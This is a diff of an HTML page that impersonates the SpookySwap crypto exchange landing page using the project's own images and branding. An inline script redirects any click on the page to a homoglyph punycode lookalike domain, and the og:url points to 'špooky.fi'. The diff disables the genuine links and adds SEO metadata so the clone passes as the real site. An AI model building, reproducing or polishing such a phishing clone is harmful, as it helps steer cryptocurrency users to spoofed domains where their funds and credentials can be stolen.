@@ -1,14 +1,26 @@
+```html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpookySwap</title>
+    <meta name="description" content="SpookySwap - The Portal to DeFi. All-in-one decentralized exchange for leveraging diversified funds across ecosystems on Fantom">
+    <meta name="keywords" content="SpookySwap, DeFi, DEX, Fantom, Cryptocurrency, Swap, Liquidity, Farming, Staking, BOO token">
+    <meta name="robots" content="index, follow">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://špooky.fi/">
+    <meta property="og:title" content="SpookySwap - The Portal to DeFi">
+    <meta property="og:description" content="All-in-one DEX for leveraging funds across ecosystems on Fantom">
+    <meta property="og:image" content="https://cdn.spooky.fi/ghost.4419f2b1.png">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:title" content="SpookySwap - The Portal to DeFi">
+    <link rel="icon" href="https://cdn.spooky.fi/logo.31c2306a.png">
+    <title>SpookySwap - Portal to DeFi | DEX on Fantom</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             document.body.addEventListener('click', () => {
-                 window.location.href = 'https://xn--pooky-n0a.fi/';
+                window.location.href = 'https://xn--pooky-udb.fi/';
             });
         });
     </script>
@@ -16,33 +28,25 @@
         body {
             background: #0B1A33;
             color: white;
-            font-family: system-ui, -apple-system, sans-serif;
+            font-family: system-ui;
             cursor: pointer;
         }
         .bg-custom {
             background: radial-gradient(169.56% 169.56% at 50% -69.56%, #031022 0%, #02081A 73.96%);
         }
-        .logo {
-            width: 24px;
-            height: 24px;
-            content: url('https://cdn.spooky.fi/logo.31c2306a.png');
-        }
         .get-started-btn {
             background-color: #00B2FF;
             padding: 12px 32px;
             border-radius: 9999px;
-            transition: all 0.2s;
             width: 200px;
-        }
-        .get-started-btn:hover {
-            background-color: #0090CC;
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         .planet {
             position: absolute;
             right: 10%;
             top: 15%;
             width: 500px;
-            height: 500px;
             content: url('https://cdn.spooky.fi/ghost.4419f2b1.png');
         }
         .small-planet1 {
@@ -59,24 +63,16 @@
             width: 80px;
             content: url('https://cdn.spooky.fi/fantom.3f8c73c6.png');
         }
-        .discord-icon {
-            content: url('https://cdn.spooky.fi/discord.7cc37061.svg');
-        }
-        .twitter-icon {
-            content: url('https://cdn.spooky.fi/twitter.391d3c2d.svg');
-        }
-        .github-icon {
-            content: url('https://cdn.spooky.fi/github.a53ca606.svg');
-        }
-        .telegram-icon {
-            content: url('https://cdn.spooky.fi/telegram.c6fde0e3.svg');
-        }
         .social-icon {
             width: 24px;
             height: 24px;
             opacity: 0.5;
             cursor: not-allowed;
         }
+        .discord-icon { content: url('https://cdn.spooky.fi/discord.7cc37061.svg'); }
+        .twitter-icon { content: url('https://cdn.spooky.fi/twitter.391d3c2d.svg'); }
+        .github-icon { content: url('https://cdn.spooky.fi/github.a53ca606.svg'); }
+        .telegram-icon { content: url('https://cdn.spooky.fi/telegram.c6fde0e3.svg'); }
     </style>
 </head>
 <body>
@@ -84,7 +80,7 @@
         <nav class="flex justify-between items-center p-4">
             <div class="flex items-center space-x-8">
                 <div class="flex items-center space-x-2">
-                    <div class="logo"></div>
+                    <img src="https://cdn.spooky.fi/logo.31c2306a.png" alt="Logo" class="w-6 h-6">
                     <span class="font-bold">SpookySwap</span>
                 </div>
                 <div class="flex space-x-6">
@@ -118,7 +114,7 @@
                 <div class="text-center mt-20">
                     <h2 class="text-5xl font-bold mb-8">SpookySwap V3</h2>
                     <div class="flex flex-col items-center space-y-4">
-                        <a href="your-url-here" class="get-started-btn text-center">Get started</a>
+                        <div class="get-started-btn text-center">Get started</div>
                         <button class="flex items-center text-gray-400 opacity-50 cursor-not-allowed">
                             Learn more
                             <svg class="w-4 h-4 ml-2" viewBox="0 0 24 24" fill="none" stroke="currentColor">
@@ -136,3 +132,4 @@
     </div>
 </body>
 </html>
+
